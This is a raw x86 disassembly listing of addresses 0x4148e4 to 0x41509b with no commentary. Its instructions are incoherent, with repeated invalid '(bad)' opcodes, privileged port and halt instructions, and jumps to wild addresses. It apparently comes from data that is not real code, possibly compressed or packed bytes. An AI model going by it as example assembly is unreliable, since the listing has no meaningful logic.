  4148e4:	ins    DWORD PTR es:[edi],dx
  4148e5:	rcl    BYTE PTR [ebx-0x7ae9446c],1
  4148eb:	cmp    cl,ch
  4148ed:	iret   
  4148ee:	dec    ebp
  4148ef:	je     0x4148e9
  4148f1:	cmp    al,0x12
  4148f3:	repnz push ds
  4148f5:	adc    eax,0x8bb8834c
  4148fa:	imul   edi,esi,0x5c5d015
  414900:	or     DWORD PTR [edx-0x69],0x41433e01
  414907:	dec    edi
  414908:	popf   
  414909:	pop    eax
  41490a:	stc    
  41490b:	add    eax,0x72fa7bd9
  414910:	ret    0xf663
  414913:	push   ebp
  414914:	call   0x4180da73
  414919:	imul   ecx,DWORD PTR [ebx-0x56],0x3d8a416b
  414920:	clc    
  414921:	cmp    BYTE PTR [ecx],cl
  414923:	enter  0xff7f,0x9d
  414927:	jns    0x41499b
  414929:	jo     0x4149a0
  41492b:	cld    
  41492c:	jle    0x4148da
  41492e:	or     BYTE PTR [ebx+0xba99563],cl
  414934:	mov    esi,0x7af087e8
  414939:	js     0x414958
  41493b:	int    0xbc
  41493d:	sbb    BYTE PTR ds:0x7c529147,cl
  414943:	xchg   DWORD PTR [ecx+0x56],ebx
  414946:	xor    al,0xfb
  414948:	cwde   
  414949:	rcr    BYTE PTR [eax],0xb8
  41494c:	pop    ecx
  41494d:	jg     0x414987
  41494f:	dec    esp
  414950:	scas   eax,DWORD PTR es:[edi]
  414951:	int3   
  414952:	xchg   edx,eax
  414953:	dec    edx
  414954:	loope  0x4149a2
  414956:	outs   dx,DWORD PTR ds:[esi]
  414957:	cmp    bh,BYTE PTR ds:0x6105a51c
  41495d:	cmp    DWORD PTR [ebp+0x5],edx
  414960:	mov    WORD PTR [eax+eiz*4-0x77],?
  414964:	dec    edi
  414965:	and    ecx,esp
  414967:	neg    BYTE PTR [ecx-0x1c7a5c12]
  41496d:	cld    
  41496e:	push   cs
  41496f:	sub    bh,cl
  414971:	push   edi
  414972:	es jb  0x41496b
  414975:	in     al,dx
  414976:	mov    ebx,0xb4bc3ac8
  41497b:	or     dh,BYTE PTR [edi+0x3a]
  41497e:	repz ror BYTE PTR [edi-0x40977ccc],cl
  414985:	shl    BYTE PTR [ecx+0x59],0x6a
  414989:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41498a:	je     0x4149c1
  41498c:	ud2    
  41498e:	mov    ch,0xd6
  414990:	or     dh,BYTE PTR [edx+edi*2]
  414993:	ss jbe 0x4149c5
  414996:	jmp    0xf5e465ad
  41499b:	adc    BYTE PTR [esi-0x57],bh
  41499e:	sub    DWORD PTR [edi-0x4f181f80],ecx
  4149a4:	cmp    dl,BYTE PTR [edx-0x59]
  4149a7:	jo     0x4149e1
  4149a9:	ret    
  4149aa:	or     ebx,ebx
  4149ac:	xlat   BYTE PTR ds:[ebx]
  4149ad:	fnstcw WORD PTR [edi+edi*4-0x62732d77]
  4149b4:	into   
  4149b5:	sbb    bh,0x77
  4149b8:	push   ebx
  4149b9:	jmp    0x414943
  4149bb:	jno    0x4149d9
  4149bd:	cmp    edi,DWORD PTR [ebp-0x76]
  4149c0:	int    0x7b
  4149c2:	arpl   WORD PTR [ebx+0xdb11b6b],bx
  4149c8:	and    al,0x5f
  4149ca:	in     al,dx
  4149cb:	pop    es
  4149cc:	jns    0x4149bd
  4149ce:	test   DWORD PTR [ecx-0x20365228],ebp
  4149d4:	icebp  
  4149d5:	sub    eax,0x99678b46
  4149da:	shl    DWORD PTR [esi+eiz*8],cl
  4149dd:	xchg   edi,eax
  4149de:	lods   al,BYTE PTR ds:[esi]
  4149df:	push   edx
  4149e0:	sti    
  4149e1:	pop    ebx
  4149e2:	imul   esp,DWORD PTR [edx-0x43],0xfffffff0
  4149e6:	push   esp
  4149e7:	ins    BYTE PTR es:[edi],dx
  4149e8:	mov    ch,0x6e
  4149ea:	jbe    0x41498f
  4149ec:	out    0x35,al
  4149ee:	(bad)  
  4149ef:	fisttp DWORD PTR [eax+0x8b565a5]
  4149f5:	xor    BYTE PTR [ebx-0x50],al
  4149f8:	fmul   QWORD PTR [esi-0x7e]
  4149fb:	out    0x48,eax
  4149fd:	call   0x4375e150
  414a02:	daa    
  414a03:	test   BYTE PTR [edx+0x7e19a758],0x55
  414a0a:	scas   eax,DWORD PTR es:[edi]
  414a0b:	mov    dl,0x3a
  414a0d:	dec    edi
  414a0e:	clc    
  414a0f:	cmp    eax,DWORD PTR [edi-0x7d]
  414a12:	pop    edi
  414a13:	push   cs
  414a14:	cld    
  414a15:	push   esp
  414a16:	inc    ecx
  414a17:	xchg   esi,eax
  414a18:	jmp    0x4149f4
  414a1a:	xchg   DWORD PTR [esi-0x21],esp
  414a1d:	imul   esp,DWORD PTR [esi+0x7c],0x954348ad
  414a24:	repz aam 0x80
  414a27:	push   edx
  414a28:	fwait
  414a29:	je     0x414a1b
  414a2b:	test   BYTE PTR [edx-0x32],0xca
  414a2f:	repz je 0x414a58
  414a32:	xlat   BYTE PTR ds:[ebx]
  414a33:	mov    eax,ecx
  414a35:	aaa    
  414a36:	adc    edi,DWORD PTR [edx]
  414a38:	push   ss
  414a39:	add    eax,0xd7beb55a
  414a3e:	mov    ecx,0x34986511
  414a43:	ficomp WORD PTR [esi-0x2542ac84]
  414a49:	cmp    dl,BYTE PTR [ebx]
  414a4b:	pushf  
  414a4c:	ins    BYTE PTR es:[edi],dx
  414a4d:	fiadd  WORD PTR [ebx+eiz*2+0x5e727be9]
  414a54:	mov    ds:0x65f64e77,al
  414a59:	jmp    0xeb9c81e6
  414a5e:	(bad)  
  414a60:	mov    cl,0x51
  414a62:	push   ebx
  414a63:	sub    esi,DWORD PTR [edx+0x3b]
  414a66:	and    al,0xe7
  414a68:	arpl   WORD PTR [ecx+0x4f3a0143],bp
  414a6e:	cmp    al,0xf4
  414a70:	xchg   BYTE PTR [ebx+0x26],ah
  414a73:	fld    QWORD PTR [ecx+0xf4f7e54]
  414a79:	inc    edi
  414a7a:	jne    0x414a36
  414a7c:	fwait
  414a7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a7e:	fmul   QWORD PTR [edi]
  414a80:	and    eax,0xf0eeba9b
  414a85:	pop    ds
  414a86:	fwait
  414a87:	mov    ds:0x7c3cf269,eax
  414a8c:	mov    esi,0x5d8bcbda
  414a91:	push   es
  414a92:	arpl   WORD PTR ds:0x35ee4214,bx
  414a98:	dec    edi
  414a99:	mov    ds:0xba1b0126,al
  414a9e:	hlt    
  414a9f:	out    dx,eax
  414aa0:	jmp    0x63e3:0xe1cf4678
  414aa7:	mov    ds:0x43875725,al
  414aac:	retf   
  414aad:	(bad)  
  414aae:	in     al,dx
  414aaf:	xor    esp,DWORD PTR [ebp-0x59]
  414ab2:	and    dh,ch
  414ab4:	jl     0x414b28
  414ab6:	ins    DWORD PTR es:[edi],dx
  414ab7:	je     0x414a60
  414ab9:	mov    eax,ds:0x21bad35b
  414abe:	es jle 0x414ad6
  414ac1:	pop    eax
  414ac2:	(bad)  
  414ac3:	test   DWORD PTR [ebx-0x56],eax
  414ac6:	fs pop ebp
  414ac8:	jo     0x414ad7
  414aca:	hlt    
  414acb:	pop    esp
  414acc:	add    al,0x5f
  414ace:	dec    ebx
  414acf:	pop    esp
  414ad0:	jns    0x414b2a
  414ad2:	repz inc ebx
  414ad4:	out    dx,al
  414ad5:	loopne 0x414b42
  414ad7:	mov    eax,ds:0x6828ad6f
  414adc:	pop    edi
  414add:	push   ds
  414ade:	fdivr  DWORD PTR [ebx]
  414ae0:	mov    al,0x95
  414ae2:	jo     0x414ab7
  414ae4:	inc    ebx
  414ae5:	test   DWORD PTR [edi-0x1f],ebx
  414ae8:	aam    0x79
  414aea:	add    al,BYTE PTR [edx-0x1b]
  414aed:	mov    bh,0x3d
  414aef:	push   ebx
  414af0:	jge    0x414b28
  414af2:	xchg   ebp,eax
  414af3:	or     al,0x6a
  414af5:	push   cs
  414af6:	sub    BYTE PTR [esi-0x6670eac7],0x4a
  414afd:	int3   
  414afe:	xor    bl,BYTE PTR [edx+0x68]
  414b01:	out    0xdd,eax
  414b03:	jge    0x414abd
  414b05:	fwait
  414b06:	sbb    dl,dh
  414b08:	add    BYTE PTR [edi-0x146a329a],ah
  414b0e:	dec    edi
  414b0f:	mov    ds:0x5c5ceb30,eax
  414b14:	test   BYTE PTR [ebx+0x27],bh
  414b17:	fist   DWORD PTR [edx+0x76581846]
  414b1d:	sub    edx,esi
  414b1f:	adc    al,0xe9
  414b21:	xor    DWORD PTR [esi+eiz*1-0x649f4dc0],ebp
  414b28:	rol    DWORD PTR [esi],cl
  414b2a:	adc    eax,0x5dd78d3b
  414b2f:	pop    esi
  414b30:	les    ebp,FWORD PTR ds:0xb3e09d24
  414b36:	test   al,0x98
  414b38:	jo     0x414bb5
  414b3a:	sbb    DWORD PTR [eax],0x1a
  414b3d:	push   esp
  414b3e:	jmp    0xd79c55d1
  414b43:	cli    
  414b44:	cwde   
  414b45:	out    dx,al
  414b46:	sub    ch,BYTE PTR [edi-0x75]
  414b49:	push   ss
  414b4a:	pop    ebp
  414b4b:	xor    DWORD PTR [edi+0xa],edi
  414b4e:	retf   
  414b4f:	cmc    
  414b50:	in     al,dx
  414b51:	xchg   edi,eax
  414b52:	popf   
  414b53:	les    edx,FWORD PTR [esi]
  414b55:	xchg   ecx,eax
  414b56:	cmc    
  414b57:	les    esp,FWORD PTR [ebx-0x7f]
  414b5a:	popf   
  414b5b:	arpl   WORD PTR ds:0x5d056307,ax
  414b61:	in     eax,0x2a
  414b63:	lds    edx,FWORD PTR [ecx-0x6]
  414b66:	jns    0x414bc7
  414b68:	sahf   
  414b69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b6a:	jmp    0x5e16:0x3c7e2bbb
  414b71:	dec    ecx
  414b72:	aam    0x24
  414b74:	ins    DWORD PTR es:[edi],dx
  414b75:	aaa    
  414b76:	dec    esp
  414b77:	icebp  
  414b78:	push   edi
  414b79:	loop   0x414b7f
  414b7b:	jl     0x414b8a
  414b7d:	je     0x414bcc
  414b7f:	cmp    ch,BYTE PTR [edi+esi*4]
  414b82:	fs pop eax
  414b84:	or     bl,ch
  414b86:	xchg   BYTE PTR [ebp+esi*2-0x60eb7bae],bh
  414b8d:	cmp    DWORD PTR [eax],esp
  414b8f:	pop    edi
  414b90:	fisubr DWORD PTR [ecx-0x60d6ee03]
  414b96:	mov    eax,0x1b786a14
  414b9b:	pop    esp
  414b9c:	push   ebp
  414b9d:	add    eax,0x45a1e959
  414ba2:	or     al,0xaf
  414ba4:	leave  
  414ba5:	xchg   ecx,eax
  414ba6:	mov    al,ds:0xac96c2b1
  414bab:	xchg   edi,eax
  414bac:	push   cs
  414bad:	jecxz  0x414b94
  414baf:	mul    DWORD PTR [ecx+eax*1+0x36a16866]
  414bb6:	inc    ecx
  414bb7:	addr16 inc eax
  414bb9:	xlat   BYTE PTR ds:[ebx]
  414bba:	imul   edx,DWORD PTR [eax+ecx*8-0x6c146095],0xd551234f
  414bc5:	jbe    0x414c0a
  414bc7:	push   esp
  414bc8:	inc    eax
  414bc9:	aaa    
  414bca:	inc    eax
  414bcb:	(bad)  
  414bcc:	mov    eax,0x31876b63
  414bd1:	mov    edi,0x51f8f7d5
  414bd6:	xchg   esi,eax
  414bd7:	ret    
  414bd8:	lahf   
  414bd9:	out    0x60,al
  414bdb:	lods   al,BYTE PTR ds:[esi]
  414bdc:	fild   WORD PTR [ebp-0x1c962803]
  414be2:	adc    eax,0x690c5160
  414be7:	pop    ebp
  414be8:	std    
  414be9:	xchg   ebx,eax
  414bea:	bound  esi,QWORD PTR [ebp-0x44]
  414bed:	hlt    
  414bee:	shl    DWORD PTR [esi+0x41],cl
  414bf1:	dec    edi
  414bf2:	jo     0x414c4f
  414bf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bf5:	cmp    ecx,DWORD PTR [edx-0x7764fb39]
  414bfb:	scas   al,BYTE PTR es:[edi]
  414bfc:	arpl   WORD PTR [ecx-0xf],si
  414bff:	test   BYTE PTR [ebx+0x4303efe6],ch
  414c05:	test   DWORD PTR [ebx+eiz*8+0xf],ebx
  414c09:	and    eax,0x36cdfc17
  414c0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c0f:	imul   ch
  414c11:	mov    ds:0xf8382277,al
  414c16:	push   ebp
  414c17:	popa   
  414c18:	fs xchg cl,ah
  414c1b:	dec    ebx
  414c1c:	in     eax,dx
  414c1d:	or     DWORD PTR [edi+0x6703f846],0xadd1e043
  414c27:	add    al,0xe2
  414c29:	mov    ecx,DWORD PTR [ecx]
  414c2b:	inc    ebx
  414c2c:	fdiv   st,st(2)
  414c2e:	ins    BYTE PTR es:[edi],dx
  414c2f:	push   ecx
  414c30:	std    
  414c31:	test   DWORD PTR [ecx+eiz*4+0x7cebaad9],esp
  414c38:	pop    ebx
  414c39:	and    ch,ah
  414c3b:	dec    edi
  414c3c:	imul   eax,ebx,0xcda1457
  414c42:	ins    BYTE PTR es:[edi],dx
  414c43:	repnz mov edx,ebp
  414c46:	rol    BYTE PTR [ebp+0x6e],cl
  414c49:	fdivp  st(2),st
  414c4b:	sub    BYTE PTR [edi+ebx*1-0x3b40c62e],dl
  414c52:	inc    eax
  414c53:	imul   eax,DWORD PTR [edx+0x5b5d7a47],0xffffff80
  414c5a:	mov    edx,0x965ff106
  414c5f:	retf   
  414c60:	push   edx
  414c61:	mov    dl,BYTE PTR [edx-0x247ad4ca]
  414c67:	and    DWORD PTR [edi-0x7627c8fb],esp
  414c6d:	(bad)  
  414c6e:	hlt    
  414c6f:	loope  0x414cc8
  414c71:	xchg   esp,eax
  414c72:	adc    al,0x50
  414c74:	mov    dl,0x3
  414c76:	fmul   QWORD PTR [edx+0x21]
  414c79:	push   ebx
  414c7a:	dec    edi
  414c7b:	dec    edi
  414c7c:	ss inc ebp
  414c7e:	imul   ebp,DWORD PTR [ecx],0x37
  414c81:	pushf  
  414c82:	(bad)  
  414c84:	xchg   DWORD PTR [edi-0x2b],eax
  414c87:	xchg   esp,eax
  414c88:	jl     0x414c1b
  414c8a:	stc    
  414c8b:	out    0xe2,eax
  414c8d:	mov    bh,dl
  414c8f:	std    
  414c90:	ret    
  414c91:	cs inc ecx
  414c93:	pop    eax
  414c94:	push   cs
  414c95:	rcl    DWORD PTR [ebx-0x70fea665],0xf2
  414c9c:	or     dl,ch
  414c9e:	pop    edi
  414c9f:	ds jno 0x414d12
  414ca2:	xchg   ebp,eax
  414ca3:	mov    ?,ebx
  414ca5:	inc    ebp
  414ca6:	pop    ss
  414ca7:	push   0xffffffee
  414ca9:	je     0x414cf8
  414cab:	ret    0xc0
  414cae:	ret    
  414caf:	sar    DWORD PTR [ebx],cl
  414cb1:	fucomp st(6)
  414cb3:	and    ch,bh
  414cb5:	mov    edi,0x37a315f5
  414cba:	xchg   esp,eax
  414cbb:	sub    dl,BYTE PTR [esi+0x43]
  414cbe:	mov    ds:0xcda20575,eax
  414cc3:	inc    esi
  414cc4:	(bad)  
  414cc5:	or     esp,DWORD PTR [eax-0x37]
  414cc8:	(bad)  
  414cc9:	jbe    0x414cdb
  414ccb:	shl    DWORD PTR [edx+0xa75951d],1
  414cd1:	or     DWORD PTR [eax],0x25085e86
  414cd7:	jo     0x414cae
  414cd9:	popa   
  414cda:	mov    eax,ds:0xdd9cfabe
  414cdf:	xchg   esp,eax
  414ce0:	pop    ecx
  414ce1:	(bad)  
  414ce2:	fwait
  414ce3:	add    esi,DWORD PTR [ebp-0x2e329228]
  414ce9:	stc    
  414cea:	stc    
  414ceb:	dec    edi
  414cec:	fadd   QWORD PTR [ecx+0x40]
  414cef:	lods   al,BYTE PTR ds:[esi]
  414cf0:	xchg   esp,eax
  414cf1:	shr    BYTE PTR [ebp+0x53d09888],0xae
  414cf8:	adc    dl,BYTE PTR [eax+0x29]
  414cfb:	femms  
  414cfd:	cmc    
  414cfe:	cs scas eax,DWORD PTR es:[edi]
  414d00:	jmp    DWORD PTR [esi+esi*1+0x37]
  414d04:	iret   
  414d05:	pop    es
  414d06:	mov    dl,0xe0
  414d08:	sub    BYTE PTR [ebx-0x15],al
  414d0b:	nop
  414d0c:	ds push 0x6d260ef5
  414d12:	icebp  
  414d13:	int3   
  414d14:	sub    ebp,esi
  414d16:	stos   BYTE PTR es:[edi],al
  414d17:	and    eax,0x4357cb50
  414d1c:	lds    ebx,FWORD PTR [eax]
  414d1e:	inc    eax
  414d1f:	add    DWORD PTR [eax+0x1c],0xd1c65220
  414d26:	dec    esp
  414d27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d28:	js     0x414cbc
  414d2a:	sti    
  414d2b:	mov    ebx,0x67a138a9
  414d30:	in     eax,dx
  414d31:	mov    esp,esi
  414d33:	imul   edi,DWORD PTR [edx],0xfffffffe
  414d36:	cld    
  414d37:	popf   
  414d38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d39:	jmp    0x5427:0xe767bc75
  414d40:	ret    
  414d41:	xor    esi,0x92ed5d5e
  414d47:	aaa    
  414d48:	or     DWORD PTR [ecx-0x2ca64907],edx
  414d4e:	add    eax,0x5e271214
  414d53:	mov    edx,0xdc449bb3
  414d58:	lds    ax,DWORD PTR [ebp+0x55]
  414d5c:	icebp  
  414d5d:	dec    ebx
  414d5e:	out    0x97,al
  414d60:	addr16 mov al,ds:0x6272
  414d64:	js     0x414d81
  414d66:	xor    BYTE PTR [edx-0x50],ch
  414d69:	inc    esp
  414d6a:	es fcomp DWORD PTR ss:[ebp+0x2c3e0603]
  414d72:	sub    BYTE PTR [ebx],dl
  414d74:	push   edi
  414d75:	xchg   esp,eax
  414d76:	mov    ecx,0xe7e3d48e
  414d7b:	shr    BYTE PTR [edi+eax*1+0x78],cl
  414d7f:	xchg   esi,eax
  414d80:	fistp  QWORD PTR [edx-0x30810acf]
  414d86:	dec    ecx
  414d87:	xor    al,0xf1
  414d89:	ret    
  414d8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d8b:	aaa    
  414d8c:	data16 sub al,0xf
  414d8f:	loop   0x414d69
  414d91:	outs   dx,DWORD PTR ds:[esi]
  414d92:	test   BYTE PTR [ebx],ch
  414d94:	adc    dh,bh
  414d96:	jmp    0xcc4381cb
  414d9b:	pop    ss
  414d9c:	inc    esi
  414d9d:	xchg   BYTE PTR [esi-0x4e],dl
  414da0:	in     al,0x7
  414da2:	pop    es
  414da3:	call   0xfe91:0x398eedb1
  414daa:	fisub  DWORD PTR [edx+0x60]
  414dad:	je     0x414dc1
  414daf:	cmc    
  414db0:	mov    al,ds:0xd7a2355f
  414db5:	xor    BYTE PTR [ebx+0x62cea139],bh
  414dbb:	inc    ebp
  414dbc:	idiv   BYTE PTR [ebx+0x175565d3]
  414dc2:	popa   
  414dc3:	enter  0xf452,0x84
  414dc7:	or     al,al
  414dc9:	push   eax
  414dca:	es out 0xe,eax
  414dcd:	xor    al,0x71
  414dcf:	jbe    0x414e3a
  414dd1:	push   ds
  414dd2:	fwait
  414dd3:	es aam 0xbd
  414dd6:	aad    0x47
  414dd8:	add    ch,BYTE PTR [eax+eax*2+0x26]
  414ddc:	ror    ch,1
  414dde:	addr16 ja 0x414e50
  414de1:	xchg   edi,eax
  414de2:	xchg   ebx,eax
  414de3:	daa    
  414de4:	mov    edi,0x8cd096bd
  414de9:	scas   al,BYTE PTR es:[edi]
  414dea:	fdivr  DWORD PTR [ecx-0xba7ae8e]
  414df0:	rcl    DWORD PTR [esi],0x97
  414df3:	add    al,0xd5
  414df5:	jb     0x414e69
  414df7:	xchg   edx,eax
  414df8:	and    BYTE PTR gs:[ecx-0x2268d15b],ch
  414dff:	adc    ah,bh
  414e01:	lods   eax,DWORD PTR ds:[esi]
  414e02:	leave  
  414e03:	and    BYTE PTR [esi-0x1ed18d2d],al
  414e09:	cli    
  414e0a:	sti    
  414e0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e0c:	or     al,0xcd
  414e0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e0f:	cs mov ebp,0x8817b4bd
  414e15:	jb     0x414e2f
  414e17:	cmp    al,0xce
  414e19:	cmp    BYTE PTR [ebp+0x3ab83bf8],cl
  414e1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e21:	gs imul ebx,edx,0x833a86ec
  414e28:	dec    esi
  414e29:	mov    dl,0xf
  414e2b:	nop
  414e2c:	jmp    FWORD PTR [ecx-0x27a38adf]
  414e32:	(bad)  
  414e33:	mov    ebp,0x7a8711b4
  414e38:	xchg   ebp,eax
  414e39:	in     eax,dx
  414e3a:	add    bh,bh
  414e3c:	addr16 mov al,ds:0x14be
  414e40:	push   0x6
  414e42:	lods   eax,DWORD PTR ds:[esi]
  414e43:	aas    
  414e44:	test   dl,dl
  414e46:	dec    ecx
  414e47:	rcr    DWORD PTR [ebx-0xb],1
  414e4a:	jmp    0x414dde
  414e4c:	push   edi
  414e4d:	push   edx
  414e4e:	ficom  WORD PTR [ebx-0x5e]
  414e51:	cmp    dh,BYTE PTR [edi]
  414e53:	outs   dx,DWORD PTR ds:[esi]
  414e54:	push   ds
  414e55:	mov    esi,0x6a40b96
  414e5a:	xor    bh,ch
  414e5c:	ret    
  414e5d:	sub    edi,DWORD PTR [edi+0x65]
  414e60:	scas   al,BYTE PTR es:[edi]
  414e61:	inc    esp
  414e62:	push   ebx
  414e63:	mov    ds,WORD PTR [ebp+0xa664ae8]
  414e69:	push   esp
  414e6a:	aas    
  414e6b:	call   0x583863d5
  414e70:	loope  0x414ee2
  414e72:	lds    edx,FWORD PTR [edi-0x1f2b528d]
  414e78:	sub    al,cl
  414e7a:	int    0xdf
  414e7c:	or     dh,BYTE PTR [edx]
  414e7e:	ror    DWORD PTR ds:0x17c21471,cl
  414e84:	sub    BYTE PTR [edi+0x7c0e46eb],dh
  414e8a:	mov    bh,0xa6
  414e8c:	fwait
  414e8d:	push   eax
  414e8e:	mov    edx,0xd44a032f
  414e93:	in     al,0x73
  414e95:	(bad)  
  414e96:	sub    dh,BYTE PTR [ebx+0x7d3ce2d6]
  414e9c:	xor    al,0x88
  414e9e:	push   edi
  414e9f:	or     al,0xb8
  414ea1:	and    BYTE PTR [ebx+0x4147a702],dl
  414ea7:	loopne 0x414e72
  414ea9:	xchg   ebx,eax
  414eaa:	popf   
  414eab:	or     al,0x74
  414ead:	cli    
  414eae:	pop    ss
  414eaf:	pusha  
  414eb0:	add    ebx,DWORD PTR [edi+0xa]
  414eb3:	lock or DWORD PTR [edx+0x58],edi
  414eb7:	aad    0xb5
  414eb9:	xor    eax,0x6034f431
  414ebe:	mov    BYTE PTR [esi-0x2af2d0f4],bl
  414ec4:	xor    al,BYTE PTR [ecx+0x30]
  414ec7:	xchg   ebp,eax
  414ec8:	sub    BYTE PTR [ebp-0x461e91e6],bh
  414ece:	cmp    esp,DWORD PTR [ebx-0x4fe90b06]
  414ed4:	mov    ecx,0x7c87a18d
  414ed9:	aas    
  414eda:	pop    edx
  414edb:	mov    al,0xc
  414edd:	and    BYTE PTR [esi+0x7b8005cc],0xba
  414ee4:	dec    edi
  414ee5:	sub    dh,BYTE PTR [edx]
  414ee7:	clc    
  414ee8:	jbe    0x414f26
  414eea:	mov    ds:0xf88b4e39,al
  414eef:	push   ebx
  414ef0:	or     bl,BYTE PTR [ebx-0x2686c323]
  414ef6:	mov    ds:0x48fb6bc9,eax
  414efb:	sahf   
  414efc:	adc    eax,0xe3d90edc
  414f01:	ins    DWORD PTR es:[edi],dx
  414f02:	xchg   esi,eax
  414f03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f04:	adc    al,0x1b
  414f06:	dec    ecx
  414f07:	mov    cs,WORD PTR [ebx+0x4e]
  414f0a:	(bad)  
  414f0b:	adc    al,0x3e
  414f0d:	sahf   
  414f0e:	aas    
  414f0f:	rol    DWORD PTR [ecx-0x7a],0x94
  414f13:	fst    st(0)
  414f15:	push   0xc923b084
  414f1a:	pop    ebx
  414f1b:	dec    esi
  414f1c:	cmc    
  414f1d:	and    al,0x31
  414f1f:	jns    0x414ee2
  414f21:	pusha  
  414f22:	pop    ss
  414f23:	mov    ch,0x2f
  414f25:	adc    esi,DWORD PTR ds:0x2f3a9b03
  414f2b:	mov    dl,0xae
  414f2d:	push   esp
  414f2e:	ficom  WORD PTR [edx-0x13d7c990]
  414f34:	mov    ecx,0xa6dab4c8
  414f39:	cmp    DWORD PTR [edx],esp
  414f3b:	add    al,dl
  414f3d:	or     cl,BYTE PTR [edi]
  414f3f:	int3   
  414f40:	aaa    
  414f41:	nop
  414f42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f43:	mov    ds:0xbaf6a440,eax
  414f48:	lahf   
  414f49:	pop    es
  414f4a:	xchg   ecx,eax
  414f4b:	mov    ds:0x2488ca03,eax
  414f50:	adc    BYTE PTR [edi+edi*2+0x47],cl
  414f54:	int    0x7c
  414f56:	cmp    al,0x61
  414f58:	fidiv  DWORD PTR [edx+eiz*4-0x1d]
  414f5c:	test   DWORD PTR [ecx+0x41a39619],eax
  414f62:	aaa    
  414f63:	dec    edi
  414f64:	cmp    ch,BYTE PTR [eax+0x4ef9313a]
  414f6a:	stos   DWORD PTR es:[edi],eax
  414f6b:	mov    eax,ds:0x518dc903
  414f70:	in     al,dx
  414f71:	aas    
  414f72:	lds    ebx,FWORD PTR [ecx+esi*2+0x2c]
  414f76:	inc    esp
  414f77:	adc    ebp,DWORD PTR [edx+ebp*8-0x33]
  414f7b:	pop    es
  414f7c:	repnz push ebp
  414f7e:	xor    bl,ch
  414f80:	mov    ch,0x6a
  414f82:	pop    ss
  414f83:	mov    dl,0xae
  414f85:	xor    bl,BYTE PTR [ecx]
  414f87:	pop    edx
  414f88:	in     eax,dx
  414f89:	adc    DWORD PTR [eax+0x60],esp
  414f8c:	cmp    esp,DWORD PTR [edi]
  414f8e:	jmp    0x3a44:0x1cb7f77d
  414f95:	fnstcw WORD PTR [edi+0x6bfcc858]
  414f9b:	sbb    BYTE PTR [ecx-0x18610f21],dh
  414fa1:	mov    ch,0x7d
  414fa3:	ins    DWORD PTR es:[edi],dx
  414fa4:	test   eax,0xc61f0c9c
  414fa9:	push   ds
  414faa:	xchg   edi,eax
  414fab:	inc    ebp
  414fac:	imul   BYTE PTR [ebx]
  414fae:	(bad)  
  414faf:	nop
  414fb0:	mov    edx,0xbf6dd05f
  414fb5:	mov    edx,ebp
  414fb7:	fdiv   QWORD PTR [ebx+0x4b8ed1d4]
  414fbd:	mov    cl,0x4b
  414fbf:	cmc    
  414fc0:	xor    eax,0x74e209dc
  414fc5:	push   0x38c34eb8
  414fca:	mov    bh,0xf7
  414fcc:	mov    BYTE PTR [edx+0x7e3f3e80],bh
  414fd2:	add    al,0xb7
  414fd4:	stos   DWORD PTR es:[edi],eax
  414fd5:	sub    al,0x8f
  414fd7:	pop    edi
  414fd8:	mov    dh,0x4c
  414fda:	dec    eax
  414fdb:	call   0xc9ff27eb
  414fe0:	push   ebp
  414fe1:	scas   eax,DWORD PTR es:[edi]
  414fe2:	loope  0x415014
  414fe4:	mov    ebx,0xb49deb12
  414fe9:	mov    edx,0xd0c587c4
  414fee:	push   es
  414fef:	std    
  414ff0:	imul   edi,DWORD PTR [esi+ebx*8+0x58cbaaa],0x63
  414ff8:	mov    ebp,0x70683d62
  414ffd:	push   ebx
  414ffe:	xchg   edi,eax
  414fff:	mov    ebx,0x730b1110
  415004:	push   edx
  415005:	nop
  415006:	and    esi,DWORD PTR es:[edi+0x28]
  41500a:	xchg   esi,eax
  41500b:	ss out 0xd9,eax
  41500e:	and    DWORD PTR [ecx+0x4f],esp
  415011:	in     al,0x7c
  415013:	add    eax,0x851d18c8
  415018:	loope  0x414fd7
  41501a:	push   0x6c5a0e9b
  41501f:	nop
  415020:	sbb    al,0xfb
  415022:	and    DWORD PTR [esi],ebp
  415024:	push   esi
  415025:	cs mov cl,0xc0
  415028:	sar    DWORD PTR [ecx+0x25],1
  41502b:	into   
  41502c:	das    
  41502d:	cmp    eax,0xa2858efb
  415032:	sbb    DWORD PTR [ebx+ebp*1],0x6cde5a8c
  415039:	out    0x9f,al
  41503b:	hlt    
  41503c:	sub    BYTE PTR [eax+0x7f],ch
  41503f:	mov    al,ds:0x30304866
  415044:	jo     0x415095
  415046:	test   eax,0x340aba21
  41504b:	xchg   esp,eax
  41504c:	sbb    ch,ah
  41504e:	mov    esp,0x7cba218a
  415053:	stos   BYTE PTR es:[edi],al
  415054:	out    0xd7,eax
  415056:	jmp    0xca89:0x538ab1c0
  41505d:	scas   eax,DWORD PTR es:[edi]
  41505e:	bound  edi,QWORD PTR [ebp-0x32]
  415061:	pop    edi
  415062:	dec    ecx
  415063:	es fcmove st,st(1)
  415066:	add    bl,BYTE PTR [edx]
  415068:	call   0x1972:0x8049b60f
  41506f:	sahf   
  415070:	loopne 0x4150b7
  415072:	fidiv  DWORD PTR [ebx+0x7dc161d1]
  415078:	xchg   ecx,eax
  415079:	and    edi,DWORD PTR [eax+0x20]
  41507c:	js     0x415014
  41507e:	add    bl,BYTE PTR [ecx+0x4e]
  415081:	dec    edi
  415082:	mov    dh,0xfe
  415084:	cli    
  415085:	popa   
  415086:	xchg   ecx,eax
  415087:	push   edx
  415088:	sar    BYTE PTR [ebp+0x2a216abd],cl
  41508e:	mov    esi,esp
  415090:	adc    ah,al
  415092:	out    dx,eax
  415093:	loope  0x415018
  415095:	in     al,0x9d
  415097:	cmp    ah,dl
  415099:	repnz pusha 
  41509b:	mov    eax,ds:0xadc15180
